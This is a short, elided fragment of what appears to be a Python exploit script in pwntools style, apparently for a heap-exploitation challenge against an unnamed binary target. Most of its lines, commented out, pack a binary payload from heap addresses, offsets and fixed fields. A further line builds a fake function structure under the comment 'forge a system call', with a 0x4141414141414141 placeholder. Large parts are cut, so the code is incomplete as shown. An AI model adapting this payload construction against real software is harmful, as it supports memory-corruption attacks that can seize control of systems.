...
def main():
    ...
    #payload2 = b""
    #payload2 += b"\x08\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00"
    #payload2 += b"\x00\x00\x00\x00\x00\x00\x00\x00"
    #payload2 += blob + p32(10000)
    #payload2 += p32(1) + p32(0) + p64(0)
    #payload2 += p64(heap + 0x500)
    #payload2 += blob + p32(0x10)
    #payload2 += p32(2) + p32(0) + p64(0)
    #payload2 += p64(heap + As_offset)
    #payload2 += copy + p32(2) + p32(1) + p32(6) + p64(0)
    ...
    #forge a system call
    dirty_func = p64(0x1) + p64(0) + p64(0) + p64(0x4141414141414141) + p64(0) + p64(0)
